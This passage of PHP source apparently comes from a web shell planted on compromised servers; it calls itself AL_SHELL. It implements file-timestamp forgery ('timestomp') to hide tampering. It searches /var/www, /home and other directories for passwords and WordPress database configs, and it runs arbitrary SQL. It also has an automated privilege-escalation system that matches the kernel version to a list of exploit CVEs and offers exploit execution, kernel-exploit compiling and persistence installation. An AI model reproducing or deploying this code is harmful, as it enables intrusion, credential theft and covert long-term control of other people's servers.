        if ($success && is_dir($path)) {
            $items = @scandir($path);
            if ($items) {
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $childPath = $path . DIRECTORY_SEPARATOR . $item;
                    chmod_recursive($childPath, $permission, $results);
                }
            }
        }
        
        return $success;
    }
    
    // Process each selected file/folder
    foreach ($_POST['selected_files'] as $file) {
        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
        
        if ($recursive && is_dir($targetPath)) {
            // Recursive chmod for directory
            chmod_recursive($targetPath, $permission, $results);
        } else {
            // Single item chmod
            if (file_exists($targetPath)) {
                $success = @chmod($targetPath, octdec($permission));
                $parentDir = dirname($targetPath);
                $results['processed'][] = [
                    'path' => $targetPath,
                    'name' => basename($targetPath),
                    'dir' => $parentDir,
                    'type' => is_dir($targetPath) ? 'dir' : 'file',
                    'success' => $success
                ];
                if ($success) {
                    $results['success_count']++;
                } else {
                    $results['errors'][] = 'Failed: ' . $targetPath;
                    $results['failed_count']++;
                }
                $results['total']++;
            } else {
                $results['errors'][] = 'Not found: ' . $targetPath;
                $results['failed_count']++;
                $results['total']++;
            }
        }
    }
    
    echo json_encode($results);
    exit;
}

// 🔥 BULK TIMESTOMP - Change file timestamps
if (isset($_POST['action']) && $_POST['action'] === 'timestomp_bulk' && !empty($_POST['selected_files'])) {
    header('Content-Type: application/json');
    
    $timestamp_str = $_POST['timestomp_time'] ?? '';
    $recursive = isset($_POST['timestomp_recursive']) && $_POST['timestomp_recursive'] === '1';
    $reference_file = $_POST['timestomp_reference'] ?? '';
    
    $results = [
        'success' => true,
        'total' => 0,
        'success_count' => 0,
        'failed_count' => 0,
        'processed' => [],
        'errors' => [],
        'timestamp_applied' => ''
    ];
    
    // Determine target timestamp
    $target_timestamp = time();
    
    if (!empty($reference_file) && file_exists($reference_file)) {
        // Use reference file's timestamp
        $target_timestamp = filemtime($reference_file);
        $results['timestamp_applied'] = date('d-m-Y H:i:s', $target_timestamp) . ' (from ' . basename($reference_file) . ')';
    } elseif (!empty($timestamp_str)) {
        // Parse DD-MM-YYYY HH:MM:SS format
        $parsed = DateTime::createFromFormat('d-m-Y H:i:s', $timestamp_str);
        if ($parsed) {
            $target_timestamp = $parsed->getTimestamp();
            $results['timestamp_applied'] = date('d-m-Y H:i:s', $target_timestamp);
        } else {
            $results['success'] = false;
            $results['errors'][] = 'Invalid timestamp format. Use: DD-MM-YYYY HH:MM:SS';
            echo json_encode($results);
            exit;
        }
    } else {
        $results['timestamp_applied'] = date('d-m-Y H:i:s', $target_timestamp) . ' (current time)';
    }
    
    // Function to recursively timestomp
    function timestomp_recursive($path, $timestamp, &$results) {
        if (!file_exists($path)) {
            $results['errors'][] = 'Not found: ' . $path;
            $results['failed_count']++;
            return false;
        }
        
        $success = @touch($path, $timestamp, $timestamp);
        $parentDir = dirname($path);
        
        $results['processed'][] = [
            'path' => $path,
            'name' => basename($path),
            'dir' => $parentDir,
            'type' => is_dir($path) ? 'dir' : 'file',
            'success' => $success,
            'new_time' => date('d-m-Y H:i:s', $timestamp)
        ];
        
        if ($success) {
            $results['success_count']++;
        } else {
            $results['errors'][] = 'Failed: ' . $path;
            $results['failed_count']++;
        }
        $results['total']++;
        
        // If directory and recursive, process children
        if ($success && is_dir($path)) {
            $items = @scandir($path);
            if ($items) {
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $childPath = $path . DIRECTORY_SEPARATOR . $item;
                    timestomp_recursive($childPath, $timestamp, $results);
                }
            }
        }
        
        return $success;
    }
    
    // Process each selected file/folder
    foreach ($_POST['selected_files'] as $file) {
        $targetPath = $dir . DIRECTORY_SEPARATOR . basename($file);
        
        if ($recursive && is_dir($targetPath)) {
            timestomp_recursive($targetPath, $target_timestamp, $results);
        } else {
            if (file_exists($targetPath)) {
                $success = @touch($targetPath, $target_timestamp, $target_timestamp);
                $parentDir = dirname($targetPath);
                
                $results['processed'][] = [
                    'path' => $targetPath,
                    'name' => basename($targetPath),
                    'dir' => $parentDir,
                    'type' => is_dir($targetPath) ? 'dir' : 'file',
                    'success' => $success,
                    'new_time' => date('d-m-Y H:i:s', $target_timestamp)
                ];
                
                if ($success) {
                    $results['success_count']++;
                } else {
                    $results['errors'][] = 'Failed: ' . $targetPath;
                    $results['failed_count']++;
                }
                $results['total']++;
            } else {
                $results['errors'][] = 'Not found: ' . $targetPath;
                $results['failed_count']++;
                $results['total']++;
            }
        }
    }
    
    echo json_encode($results);
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'unzip_file' && !empty($_POST['unzip_target'])) {
    $targetFile = $dir . DIRECTORY_SEPARATOR . basename($_POST['unzip_target']);
    $zip = new ZipArchive;
    if ($zip->open($targetFile) === TRUE) {
        $zip->extractTo($dir);
        $zip->close();
    }
    header("Location: ?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($dir));
    exit;
}
if (isset($_GET['action']) && $_GET['action'] === 'view_file') {
    $file = basename($_GET['file']);
    $filepath = $dir . DIRECTORY_SEPARATOR . $file;
    if (is_file($filepath)) {
        $raw = @file_get_contents($filepath);
        header('Content-Type: application/json');
        if (mb_check_encoding($raw, 'UTF-8')) {
            echo json_encode(['content' => $raw]);
        } else {
            echo json_encode(['content' => '[File is binary or not UTF-8 compatible]']);
        }
    } else {
        http_response_code(404);
        echo json_encode(['content' => 'File not found.']);
    }
    exit;
}
if (isset($_GET['action']) && $_GET['action'] === 'discover_websites') {
    header('Content-Type: application/json');
    $mode = $_GET['mode'] ?? 'standard';
    $searchType = $_GET['search_type'] ?? 'filename';
    $pattern = $_GET['pattern'] ?? '';
    $extractTitle = isset($_GET['extract_title']) && $_GET['extract_title'] === '1';
    $showPreview = isset($_GET['show_preview']) && $_GET['show_preview'] === '1';
    $depthMap = ['quick' => 2, 'standard' => 4, 'deep' => 6, 'brutal' => 10];
    $maxDepth = isset($depthMap[$mode]) ? $depthMap[$mode] : 4;
    $results = [];
    if ($searchType === 'filename') {
        $patterns = array_map('trim', explode(',', $pattern));
        if (empty($patterns[0])) $patterns = ['index.php', 'index.html'];
        $foundPaths = [];
        $searchPaths = ['/var/www', '/home', '/opt', '/srv', '/data', '/usr/share', getcwd()];
        foreach ($searchPaths as $basePath) {
            if (!is_dir($basePath) || !is_readable($basePath)) continue;
            scan_for_files($basePath, $patterns, $foundPaths, $results, 0, $maxDepth, $extractTitle);
        }
    } else {
        $patterns = array_map('trim', explode(',', $pattern));
        if (empty($patterns[0])) $patterns = ['DB_PASSWORD', 'password'];
        $foundFiles = [];
        $searchPaths = ['/var/www', '/home', '/opt', '/srv', '/data', getcwd()];
        $fileExtensions = ['php', 'env', 'json', 'yml', 'yaml', 'xml', 'conf', 'ini', 'txt'];
        $maxFileSize = 1024 * 1024; // 1MB
        foreach ($searchPaths as $basePath) {
            if (!is_dir($basePath) || !is_readable($basePath)) continue;
            scan_for_content($basePath, $patterns, $foundFiles, $results, 0, $maxDepth, $showPreview, $maxFileSize, $fileExtensions);
        }
    }
    echo json_encode($results);
    exit;
}
if (isset($_GET['action']) && $_GET['action'] === 'explore_db') {
    header('Content-Type: application/json');
    $configs = find_wp_configs();
    echo json_encode($configs);
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'connect_db') {
    header('Content-Type: application/json');
    $host = $_POST['db_host'] ?? 'localhost';
    $port = intval($_POST['db_port'] ?? 3306);
    $dbname = $_POST['db_name'] ?? '';
    $user = $_POST['db_user'] ?? '';
    $pass = $_POST['db_pass'] ?? '';
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        echo json_encode(['success' => true]);
    } catch (PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'get_tables') {
    header('Content-Type: application/json');
    $host = $_POST['db_host'] ?? 'localhost';
    $port = intval($_POST['db_port'] ?? 3306);
    $dbname = $_POST['db_name'] ?? '';
    $user = $_POST['db_user'] ?? '';
    $pass = $_POST['db_pass'] ?? '';
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $serverInfo = $pdo->getAttribute(PDO::ATTR_SERVER_VERSION);
        $stmt = $pdo->query("SHOW TABLES");
        $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
        echo json_encode(['success' => true, 'tables' => $tables, 'server_info' => $serverInfo]);
    } catch (PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'get_table_data') {
    header('Content-Type: application/json');
    $host = $_POST['db_host'] ?? 'localhost';
    $port = intval($_POST['db_port'] ?? 3306);
    $dbname = $_POST['db_name'] ?? '';
    $user = $_POST['db_user'] ?? '';
    $pass = $_POST['db_pass'] ?? '';
    $table = $_POST['table'] ?? '';
    $table = preg_replace('/[^a-zA-Z0-9_-]/', '', $table); // Sanitize table name
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $countStmt = $pdo->query("SELECT COUNT(*) FROM `$table`");
        $totalRows = $countStmt->fetchColumn();
        $stmt = $pdo->query("SELECT * FROM `$table` LIMIT 50");
        $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $columns = empty($data) ? [] : array_keys($data[0]);
        echo json_encode(['success' => true, 'data' => $data, 'columns' => $columns, 'total_rows' => $totalRows]);
    } catch (PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'execute_sql') {
    header('Content-Type: application/json');
    $host = $_POST['db_host'] ?? 'localhost';
    $port = intval($_POST['db_port'] ?? 3306);
    $dbname = $_POST['db_name'] ?? '';
    $user = $_POST['db_user'] ?? '';
    $pass = $_POST['db_pass'] ?? '';
    $query = $_POST['sql_query'] ?? '';
    try {
        $dsn = "mysql:host=$host;port=$port;dbname=$dbname;charset=utf8mb4";
        $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
        $startTime = microtime(true);
        $stmt = $pdo->query($query);
        $executionTime = round((microtime(true) - $startTime) * 1000, 2) . ' ms';
        if ($stmt->columnCount() > 0) {
            $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
            $columns = empty($data) ? [] : array_keys($data[0]);
            echo json_encode(['success' => true, 'data' => $data, 'columns' => $columns, 'num_rows' => count($data), 'execution_time' => $executionTime]);
        } else {
            $affectedRows = $stmt->rowCount();
            echo json_encode(['success' => true, 'message' => 'Query executed successfully', 'affected_rows' => $affectedRows, 'execution_time' => $executionTime]);
        }
    } catch (PDOException $e) {
        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
    }
    exit;
}

// 🔥 AUTO-PRIVILEGE ESCALATION SYSTEM
if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan') {
    error_reporting(0);
    ini_set('display_errors', 0);
    header('Content-Type: application/json');
    try {
        $result = privilege_escalation_scan();
        $json = json_encode($result);
        if ($json === false) {
            echo json_encode(['success' => false, 'error' => 'JSON encode error: ' . json_last_error_msg()]);
        } else {
            echo $json;
        }
    } catch (Throwable $e) {
        echo json_encode(['success' => false, 'error' => 'Scan error: ' . $e->getMessage()]);
    }
    exit;
}

// Scan individual vector (for realtime progress)
if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_vector') {
    error_reporting(0);
    ini_set('display_errors', 0);
    
    $vector = $_GET['vector'] ?? '';
    $result = ['vector' => $vector, 'success' => false, 'data' => null, 'error' => ''];
    
    try {
        switch ($vector) {
            case 'kernel':
                $result['data'] = scan_kernel_exploits();
                $result['success'] = true;
                break;
            case 'suid':
                $result['data'] = scan_suid_binaries();
                $result['success'] = true;
                break;
            case 'sudo':
                $result['data'] = scan_sudo_permissions();
                $result['success'] = true;
                break;
            case 'capabilities':
                $result['data'] = scan_capabilities();
                $result['success'] = true;
                break;
            case 'docker':
                $result['data'] = scan_docker_escape();
                $result['success'] = true;
                break;
            case 'writable':
                $result['data'] = scan_writable_paths();
                $result['success'] = true;
                break;
            case 'cron':
                $result['data'] = scan_cron_jobs();
                $result['success'] = true;
                break;
            case 'services':
                $result['data'] = scan_services();
                $result['success'] = true;
                break;
            default:
                $result['error'] = 'Unknown vector: ' . $vector;
        }
    } catch (Throwable $e) {
        $result['error'] = $e->getMessage();
    }
    
    safe_json_output($result);
}

if (isset($_POST['action']) && $_POST['action'] === 'privesc_exploit') {
    try {
        header('Content-Type: application/json');
        $method = $_POST['method'] ?? '';
        $target = $_POST['target'] ?? '';
        $result = execute_privesc_exploit($method, $target);
        echo json_encode($result);
    } catch (Exception $e) {
        safe_json_error('Exploit execution failed', $e->getMessage());
    }
    exit;
}

if (isset($_POST['action']) && $_POST['action'] === 'install_persistence') {
    try {
        header('Content-Type: application/json');
        $result = install_persistence_mechanisms();
        echo json_encode($result);
    } catch (Exception $e) {
        safe_json_error('Persistence installation failed', $e->getMessage());
    }
    exit;
}

// 🔥 ADVANCED PRIVESC ACTION HANDLERS

if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_advanced') {
    error_reporting(0);
    ini_set('display_errors', 0);
    try {
        safe_json_output(scan_advanced_privesc());
    } catch (Exception $e) {
        safe_json_error('Advanced scan failed', $e->getMessage());
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'privesc_scan_vector' && isset($_GET['vector'])) {
    $vector = $_GET['vector'];
    // Handle new vectors
    if (in_array($vector, ['ld_preload', 'path_hijacking', 'sudo_token', 'ssh_keys', 'env_variables'])) {
        error_reporting(0);
        ini_set('display_errors', 0);
        
        $result = ['vector' => $vector, 'success' => false, 'data' => null, 'error' => ''];
        
        try {
            switch ($vector) {
                case 'ld_preload':
                    $result['data'] = scan_ld_preload();
                    $result['success'] = true;
                    break;
                case 'path_hijacking':
                    $result['data'] = scan_path_hijacking();
                    $result['success'] = true;
                    break;
                case 'sudo_token':
                    $result['data'] = scan_sudo_token();
                    $result['success'] = true;
                    break;
                case 'ssh_keys':
                    $result['data'] = scan_ssh_keys();
                    $result['success'] = true;
                    break;
                case 'env_variables':
                    $result['data'] = scan_env_variables();
                    $result['success'] = true;
                    break;
            }
        } catch (Exception $e) {
            $result['error'] = $e->getMessage();
        }
        
        safe_json_output($result);
    }
}

if (isset($_POST['action']) && $_POST['action'] === 'kernel_auto_compile') {
    try {
        header('Content-Type: application/json');
        $cve = $_POST['cve'] ?? '';
        $kernel_version = $_POST['kernel_version'] ?? '';
        $result = auto_compile_kernel_exploit($cve, $kernel_version);
        echo json_encode($result);
    } catch (Exception $e) {
        safe_json_error('Kernel auto-compile failed', $e->getMessage());
    }
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'scan_shells') {
    error_reporting(0);
    ini_set('display_errors', 0);
    header('Content-Type: application/json');
    $scan_dir = $_GET['scan_dir'] ?? dirname(__FILE__);
    echo json_encode(scan_shells($scan_dir));
    exit;
}

// 🔥 VIRTUALHOST SCANNER - Find domains and document roots
// Dokumentasi: Mencari di Apache/Nginx config files sesuai distro
if (isset($_GET['action']) && $_GET['action'] === 'scan_virtualhosts') {
    error_reporting(0);
    ini_set('display_errors', 0);
    
    // Check execution environment first
    $env_check = check_execution_environment();
    if (!$env_check['can_execute']) {
        safe_json_error(
            'Cannot execute commands: All shell functions are disabled',
            implode('; ', $env_check['issues'])
        );
    }
    
    $type = $_GET['server_type'] ?? 'all';
    $results = ['success' => true, 'apache' => [], 'nginx' => [], 'litespeed' => [], 'other' => [], 'warnings' => [], 'distro' => ''];
    
    // Detect distro type
    $distro = 'unknown';
    if (is_dir('/etc/apache2/sites-available')) {
        $distro = 'debian'; // Debian/Ubuntu
    } elseif (is_dir('/etc/httpd/conf.d')) {
        $distro = 'rhel'; // CentOS/RHEL
    }
    $results['distro'] = $distro;
    
    // Apache VirtualHost scanning
    if ($type === 'apache' || $type === 'all') {
        // Paths berdasarkan dokumentasi
        $apache_paths = [];
        
        if ($distro === 'debian') {
            // Debian/Ubuntu paths
            $apache_paths = [
                '/etc/apache2/sites-available',
                '/etc/apache2/sites-enabled',
            ];
        } elseif ($distro === 'rhel') {
            // CentOS/RHEL paths
            $apache_paths = [
                '/etc/httpd/conf.d',
                '/etc/httpd/sites-available',
            ];
        } else {
            // Try all known paths
            $apache_paths = [
                '/etc/apache2/sites-available',
                '/etc/apache2/sites-enabled',
                '/etc/httpd/conf.d',
                '/etc/httpd/sites-available',
                '/usr/local/apache2/conf',
                '/opt/lampp/etc/extra',
            ];
        }
        
        foreach ($apache_paths as $path) {
            if (is_dir($path)) {
                // Pattern sesuai dokumentasi: ServerName + DocumentRoot
                $cmd = "grep -r -h -E 'ServerName|DocumentRoot|ServerAlias' " . escapeshellarg($path) . " 2>/dev/null | head -100";
                $output = execute_shell_command($cmd);
                if ($output) {
                    $results['apache'] = array_merge($results['apache'], parseApacheVirtualHosts($output));
                }
            }
        }
        
        // Try apachectl -S for configured vhosts
        $apachectl_cmd = "apachectl -S 2>/dev/null || apache2ctl -S 2>/dev/null || httpd -S 2>/dev/null";
        $apachectl_output = execute_shell_command($apachectl_cmd);
        if ($apachectl_output) {
            $results['apachectl_output'] = $apachectl_output;
        }
    }
    
    // Nginx VirtualHost scanning
    // Sesuai dokumentasi: Debian/Ubuntu vs CentOS/RHEL
    if ($type === 'nginx' || $type === 'all') {
        $nginx_paths = [];
        
        if ($distro === 'debian') {
            // Debian/Ubuntu paths
            $nginx_paths = [
                '/etc/nginx/sites-available',
                '/etc/nginx/sites-enabled',
            ];
        } elseif ($distro === 'rhel') {
            // CentOS/RHEL paths
            $nginx_paths = [
                '/etc/nginx/conf.d',
            ];
        } else {
            // Try all known paths
            $nginx_paths = [
                '/etc/nginx/sites-available',
                '/etc/nginx/sites-enabled',
                '/etc/nginx/conf.d',
                '/usr/local/nginx/conf',
                '/opt/nginx/conf',
            ];
        }
        
        foreach ($nginx_paths as $path) {
            if (is_dir($path)) {
                // Pattern sesuai dokumentasi: server_name + root
                // Contoh dari dokumentasi:
                // grep -R "server_name\|root" /etc/nginx/sites-available/ /etc/nginx/conf.d/
                $cmd = "grep -r -h -E 'server_name|root|listen' " . escapeshellarg($path) . " 2>/dev/null | head -100";
                $output = execute_shell_command($cmd);
                if ($output) {
                    $results['nginx'] = array_merge($results['nginx'], parseNginxVirtualHosts($output));
                }
            }
        }
        
        // Try nginx -T for full config dump
        $nginx_t_cmd = "nginx -T 2>/dev/null | grep -E 'server_name|root|listen' | head -100";
        $nginx_t_output = execute_shell_command($nginx_t_cmd);
        if ($nginx_t_output) {
            $results['nginx'] = array_merge($results['nginx'], parseNginxVirtualHosts($nginx_t_output));
        }
    }
    
    // LiteSpeed/OpenLiteSpeed scanning
    if ($type === 'all' || $type === 'litespeed') {
        $lsws_paths = [
            '/usr/local/lsws/conf',
            '/var/www/conf',
            '/usr/local/lsws/conf/vhosts',
        ];
        
        foreach ($lsws_paths as $path) {
            if (is_dir($path)) {
                // Try httpd_config.conf for vhost config
                $httpd_conf = $path . '/httpd_config.conf';
                if (file_exists($httpd_conf)) {
                    $content = @file_get_contents($httpd_conf);
                    if ($content) {
                        $results['litespeed'] = array_merge($results['litespeed'], parseLiteSpeedVirtualHosts($content));
                    }
                }
                
                // Try vhost.conf files
                $cmd = "find " . escapeshellarg($path) . " -name '*.conf' -exec grep -H -E 'vhRoot|docRoot|vhDomain' {} \; 2>/dev/null | head -50";
                $output = execute_shell_command($cmd);
                if ($output) {
                    $results['litespeed'] = array_merge($results['litespeed'], parseLiteSpeedGrepOutput($output));
                }
            }
        }
        
        // Try LiteSpeed API/CLI
        $lsws_admin = execute_shell_command("which lswsctrl 2>/dev/null || which olsctrl 2>/dev/null");
        if ($lsws_admin) {
            $results['litespeed_detected'] = true;
        }
    }
    
    // Remove duplicates
    $results['apache'] = array_unique($results['apache'], SORT_REGULAR);
    $results['nginx'] = array_unique($results['nginx'], SORT_REGULAR);
    
    // Add any environment warnings
    if (!empty($env_check['issues'])) {
        $results['warnings'] = $env_check['issues'];
    }
    
    safe_json_output($results);
}

function parseApacheVirtualHosts($output) {
    $vhosts = [];
    $lines = explode("\n", $output);
    $current = null;
    
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line) || strpos($line, '#') === 0) continue;
        
        // Match ServerName
        if (preg_match('/ServerName\s+([^\s]+)/i', $line, $matches)) {
            $current = ['domain' => $matches[1], 'docroot' => '', 'aliases' => []];
            $vhosts[] = $current;
        }
        // Match ServerAlias
        elseif (preg_match('/ServerAlias\s+(.+)/i', $line, $matches) && $current !== null) {
            $aliases = preg_split('/\s+/', trim($matches[1]));
            $current['aliases'] = array_filter($aliases);
            // Update last entry
            if (!empty($vhosts)) {
                $vhosts[count($vhosts) - 1]['aliases'] = $current['aliases'];
            }
        }
        // Match DocumentRoot
        elseif (preg_match('/DocumentRoot\s+["\']?([^"\'\s]+)["\']?/i', $line, $matches) && $current !== null) {
            $current['docroot'] = $matches[1];
            if (!empty($vhosts)) {
                $vhosts[count($vhosts) - 1]['docroot'] = $matches[1];
            }
        }
    }
    
    return array_filter($vhosts, function($v) {
        return !empty($v['domain']);
    });
}

function parseNginxVirtualHosts($output) {
    $vhosts = [];
    $lines = explode("\n", $output);
    $current = null;
    $in_server_block = false;
    
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line) || strpos($line, '#') === 0) continue;
        
        // Match server_name
        if (preg_match('/server_name\s+([^;]+);/i', $line, $matches)) {
            $domains = preg_split('/\s+/', trim($matches[1]));
            foreach ($domains as $domain) {
                $domain = trim($domain);
                if ($domain && $domain !== '_' && strpos($domain, '*') === false) {
                    $current = ['domain' => $domain, 'docroot' => '', 'listen' => ''];
                    $vhosts[] = $current;
                }
            }
        }
        // Match root
        elseif (preg_match('/root\s+([^;]+);/i', $line, $matches) && $current !== null) {
            $root = trim($matches[1]);
            $current['docroot'] = $root;
            if (!empty($vhosts)) {
                $vhosts[count($vhosts) - 1]['docroot'] = $root;
            }
        }
        // Match listen
        elseif (preg_match('/listen\s+([^;]+);/i', $line, $matches) && $current !== null) {
            $listen = trim($matches[1]);
            $current['listen'] = $listen;
            if (!empty($vhosts)) {
                $vhosts[count($vhosts) - 1]['listen'] = $listen;
            }
        }
    }
    
    return array_filter($vhosts, function($v) {
        return !empty($v['domain']);
    });
}

// 🔥 LiteSpeed VirtualHost Parser
function parseLiteSpeedVirtualHosts($content) {
    $vhosts = [];
    $lines = explode("\n", $content);
    $current_vhost = null;
    $in_vhost = false;
    
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line) || strpos($line, '#') === 0) continue;
        
        // Match virtualhost { block start
        if (preg_match('/^virtualhost\s+(\w+)\s*\{/i', $line, $matches)) {
            $in_vhost = true;
            $current_vhost = ['name' => $matches[1], 'domain' => '', 'docroot' => '', 'configfile' => ''];
        }
        // Match vhRoot
        elseif ($in_vhost && preg_match('/vhRoot\s+(.+)/i', $line, $matches)) {
            $current_vhost['docroot'] = trim($matches[1]);
        }
        // Match configFile
        elseif ($in_vhost && preg_match('/configFile\s+(.+)/i', $line, $matches)) {
            $current_vhost['configfile'] = trim($matches[1]);
            // Try to parse vhost config file for domain
            if (file_exists($current_vhost['configfile'])) {
                $vhost_config = @file_get_contents($current_vhost['configfile']);
                if ($vhost_config && preg_match('/vhDomain\s+(.+)/i', $vhost_config, $domain_match)) {
                    $current_vhost['domain'] = trim($domain_match[1]);
                }
            }
        }
        // Match vhDomain directly
        elseif ($in_vhost && preg_match('/vhDomain\s+(.+)/i', $line, $matches)) {
            $current_vhost['domain'] = trim($matches[1]);
        }
        // Match docRoot directly
        elseif ($in_vhost && preg_match('/docRoot\s+(.+)/i', $line, $matches)) {
            $current_vhost['docroot'] = trim($matches[1]);
        }
        // Block end
        elseif ($in_vhost && $line === '}') {
            if (!empty($current_vhost['domain']) || !empty($current_vhost['docroot'])) {
                $vhosts[] = [
                    'domain' => $current_vhost['domain'] ?: $current_vhost['name'],
                    'docroot' => $current_vhost['docroot'],
                    'listen' => '80/443'
                ];
            }
            $in_vhost = false;
            $current_vhost = null;
        }
    }
    
    return array_filter($vhosts, function($v) {
        return !empty($v['domain']);
    });
}

function parseLiteSpeedGrepOutput($output) {
    $vhosts = [];
    $lines = explode("\n", $output);
    
    foreach ($lines as $line) {
        // Format: file:vhRoot path
        if (preg_match('/^(.+):vhRoot\s+(.+)$/i', $line, $matches)) {
            $docroot = trim($matches[2]);
            // Try to extract domain from path
            $domain = basename($docroot);
            if (strpos($domain, '.') !== false) {
                $vhosts[] = [
                    'domain' => $domain,
                    'docroot' => $docroot,
                    'listen' => '80/443'
                ];
            }
        }
    }
    
    return $vhosts;
}

if (isset($_POST['action']) && $_POST['action'] === 'delete_shell') {
    header('Content-Type: application/json');
    $target = $_POST['target'] ?? '';
    if ($target && file_exists($target) && is_file($target)) {
        // Security check: ensure target is within web root or current dir
        $real_target = realpath($target);
        $web_root = realpath($_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__));
        $current_dir = realpath(dirname(__FILE__));
        
        if (strpos($real_target, $web_root) === 0 || strpos($real_target, $current_dir) === 0) {
            if (@unlink($real_target)) {
                echo json_encode(['success' => true, 'message' => 'File deleted successfully']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Failed to delete file (permission denied)']);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'Security: Target outside allowed directories']);
        }
    } else {
        echo json_encode(['success' => false, 'error' => 'File not found']);
    }
    exit;
}

function privilege_escalation_scan() {
    try {
        $results = [
            'kernel' => scan_kernel_exploits(),
            'suid' => scan_suid_binaries(),
            'sudo' => scan_sudo_permissions(),
            'capabilities' => scan_capabilities(),
            'docker' => scan_docker_escape(),
            'writable_paths' => scan_writable_paths(),
            'cron' => scan_cron_jobs(),
            'services' => scan_services()
        ];
        return ['success' => true, 'results' => $results];
    } catch (Throwable $e) {
        return ['success' => false, 'error' => $e->getMessage()];
    }
}

function scan_kernel_exploits() {
    $kernel = execute_shell_command("uname -r 2>/dev/null");
    if (!$kernel) $kernel = 'unknown';
    $kernel = trim($kernel);
    
    // 🔥 EXTENSIVE CVE DATABASE - 30+ Kernel Exploits
    // Format: [min_version, max_version, name, severity, method]
    $cve_database = [
        // 2016 - Linux 2.6.x - 4.x Era
        ['CVE-2009-1185', '2.6.0', '2.6.25', 'udev', 'CRITICAL', 'udev_event'],
        ['CVE-2012-0056', '2.6.39', '3.2.2', 'Mempodipper', 'CRITICAL', 'mem_write'],
        ['CVE-2016-0728', '3.8', '4.4.0', 'Keyring Ref Count', 'CRITICAL', 'keyring'],
        ['CVE-2016-2384', '0', '4.4.8', 'USB MIDI', 'HIGH', 'double_free'],
        ['CVE-2016-5195', '2.6.22', '4.8.3', 'Dirty COW', 'CRITICAL', 'race_condition'],
        ['CVE-2016-8655', '3.2', '4.8.13', 'AF_PACKET', 'CRITICAL', 'packet_socket'],
        ['CVE-2016-9793', '0', '4.8.14', 'SO_SNDBUFFORCE', 'HIGH', 'sock_send'],
        
        // 2017 - Linux 4.x Era
        ['CVE-2017-6074', '2.6.18', '4.9.11', 'DCCP Double Free', 'CRITICAL', 'dccp'],
        ['CVE-2017-7308', '0', '4.10.6', 'AF_PACKET', 'CRITICAL', 'packet_set_ring'],
        ['CVE-2017-1000112', '2.6.18', '4.12.9', 'Ptmx Race', 'CRITICAL', 'ptmx'],
        ['CVE-2017-1000253', '0', '4.13.2', 'Pie Stack', 'HIGH', 'binfmt_elf'],
        ['CVE-2017-16995', '0', '4.14.11', 'BPF Verifier', 'CRITICAL', 'bpf'],
        ['CVE-2017-1000405', '0', '4.14.11', 'SUID Binary', 'HIGH', ' Huge Pages'],
        
        // 2018-2019 - Linux 4.14 - 5.x Era
        ['CVE-2018-18955', '4.15', '4.19.2', 'UID Mapping', 'CRITICAL', 'user_namespace'],
        ['CVE-2019-13272', '3.2', '5.1.16', 'PTRACE_TRACEME', 'CRITICAL', 'ptrace'],
        ['CVE-2019-15666', '0', '5.0.19', 'UDP Fragment', 'HIGH', 'udp_gso'],
        ['CVE-2019-2215', '3.14', '4.14.142', 'Binder Use-After-Free', 'CRITICAL', 'binder'],
        
        // 2020-2021 - Linux 5.x Era
        ['CVE-2020-8835', '5.5', '5.6.2', 'BPF Verifier', 'CRITICAL', 'bpf_ptr_leak'],
        ['CVE-2020-14386', '4.6', '5.7.10', 'Memory Corruption', 'CRITICAL', 'af_packet'],
        ['CVE-2021-22555', '0', '5.11.14', 'Netfilter Heap OOB', 'CRITICAL', 'netfilter'],
        ['CVE-2021-3493', '0', '5.11', 'OverlayFS', 'CRITICAL', 'overlayfs'],
        ['CVE-2021-4034', '0', '5.16', 'PwnKit', 'CRITICAL', 'pkexec'],
        ['CVE-2021-3156', '0', '5.16', 'Sudo Baron Samedit', 'CRITICAL', 'sudo_heap'],
        ['CVE-2021-33909', '2.6.19', '5.13.3', 'Sequoia', 'CRITICAL', 'seq_file'],
        ['CVE-2021-41073', '0', '5.14', 'IPIP Tunnel', 'HIGH', 'ipip'],
        
        // 2022 - Linux 5.13 - 5.16 Era
        ['CVE-2022-0847', '5.8', '5.16.11', 'Dirty Pipe', 'CRITICAL', 'pipe'],
        ['CVE-2022-0995', '5.8', '5.17.3', 'FUSE', 'HIGH', 'fuse'],
        ['CVE-2022-2588', '0', '5.18', 'Dirty Cred', 'CRITICAL', 'cred'],
